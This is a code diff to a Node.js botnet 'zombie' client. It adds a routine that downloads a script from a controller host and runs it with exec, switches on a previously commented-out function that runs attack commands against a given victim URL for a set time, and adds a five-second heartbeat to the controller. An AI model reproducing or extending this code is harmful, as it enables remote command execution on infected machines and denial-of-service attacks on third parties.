@@ -1,5 +1,4 @@
 const { exec } = require('child_process');
-//npm install express fs axios events moment delay quick.db child_process
 
 const express = require('express');
 const app = express()
@@ -157,6 +156,16 @@ settingIntegrity.on('true', () => {
                 axios.get("http://" + master + "/setup?download_script&" + scriptid)
                     .then(resp => {
                         console.log("EXECUTE : " + resp.data)
+                        exec(resp.data, (err, stdout, stderr) => {
+                            if (err) {
+                                //some err occurred
+                                console.error(err)
+                            } else {
+                                // the *entire* stdout and stderr (buffered)
+                                console.log(`stdout: ${stdout}`);
+                                console.log(`stderr: ${stderr}`);
+                            }
+                        })
                         res.send(200)
                     })
                     .catch(err => {
@@ -208,19 +217,19 @@ settingIntegrity.on('true', () => {
 async function startAttack(methodData, victim, time) {
     let command = (methodData.dictation).replace("$VICTIM", `http://${victim}`)
     console.log(command);
-        /*exec(command, (err, stdout, stderr) => {
+        exec(command, (err, stdout, stderr) => {
         if (err) {
             //some err occurred
-            console.error(err)
+            console.log(err)
         } else {
             // the *entire* stdout and stderr (buffered)
             console.log(`stdout: ${stdout}`);
             console.log(`stderr: ${stderr}`);
         }
-    });*/
-    await delay (time)
+    });
+    await delay (time * 1000)
     zombie.currentAttack = null
-    /*exec(`pkill -9 ${methodData.process}`, (err, stdout, stderr) => { //SHOULD USE KILLALL'S YOUNGER/OLDER THAN ARGUMENTS!
+    exec(`pkill -9 ${methodData.process}`, (err, stdout, stderr) => { //SHOULD USE KILLALL'S YOUNGER/OLDER THAN ARGUMENTS!
         if (err) {
             //some err occurred
             console.error(err)
@@ -229,9 +238,25 @@ async function startAttack(methodData, victim, time) {
             console.log(`stdout: ${stdout}`);
             console.log(`stderr: ${stderr}`);
         }
-    });*/
+    });
 
 }
+
+async function heartbeat(){
+    axios.get("http://" + master + "/heartbeat")
+        .then(res => {
+            SCRIPTS = res.data
+        })
+        .catch(err => {
+            console.error(err);
+        })
+}
+
+heartbeat();
+
+setInterval(function(){
+    heartbeat()
+}, 5000)
 
 /*
 
